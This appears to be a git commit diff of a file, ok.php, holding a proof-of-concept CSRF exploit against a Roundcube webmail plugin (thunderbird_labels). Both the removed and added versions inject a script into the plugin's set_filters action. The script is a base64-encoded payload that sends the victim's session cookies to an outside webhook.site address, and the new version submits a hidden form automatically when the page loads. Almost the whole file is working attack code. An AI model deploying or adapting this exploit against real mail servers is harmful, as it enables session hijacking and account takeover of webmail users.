ec8009f7c74b28777860f8432a8150f874fe06b6
NGUYỄN THÀNH ĐẠT <ntdat23121999@gmail.com>
2025-05-26 17:52:00 +0700

    Update ok.php

--- ok.php
+++ ok.php
@@ -1,17 +1,23 @@
-var attacker_url = "https://webhook.site/3dec9f95-ba25-4fc8-9b0d-bf629ae6aad6";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>CSRF Exploit for Roundcube</h1>
+    <form id="csrfForm" action="http://localhost:81/webmail/" method="GET">
+        <input type="hidden" name="_task" value="mail" />
+        <input type="hidden" name="_action" value="plugin.thunderbird_labels.set_filters" />
+        <input type="hidden" name="_mbox" value="INBOX" />
+        <input type="hidden" name="_filters" value="<script>eval(atob(&quot;ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNkZWM5Zjk1LWJhMjUtNGZjOC05YjBkLWJmNjI5YWU2YWFkNj9xPScgKyAoZG9jdW1lbnQuY29va2llKSk=&quot;))</script>:0|Personal:0|To do:0|Later:0" />
+        <input type="hidden" name="_remote" value="1" />
+        <input type="hidden" name="_unlock" value="loading1748244824582" />
+        <input type="hidden" name="_" value="1748244817388" />
+    </form>
 
-fetch('/webmail/?_task=mail&_action=plugin.thunderbird_labels.set_filters&_mbox=INBOX&_filters=%3Cscript%3Eeval%28atob%28%22ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNkZWM5Zjk1LWJhMjUtNGZjOC05YjBkLWJmNjI5YWU2YWFkNj9xPScgKyAoZG9jdW1lbnQuY29va2llKSk%3D%22%29%29%3C%2Fscript%3E%3A0%7CPersonal%3A0%7CTo%20do%3A0%7CLater%3A0&_remote=1', {
-    method: 'GET'
-})
-.then(response => response.blob())
-.then(blob => {
-    const reader = new FileReader();
-    reader.onloadend = () => {
-        fetch(attacker_url, {
-            method: 'POST',
-            body: reader.result,
-            mode: 'no-cors'
-        });
-    };
-    reader.readAsDataURL(blob);
-});
+    <script>
+        // Tự động gửi form khi trang được tải
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
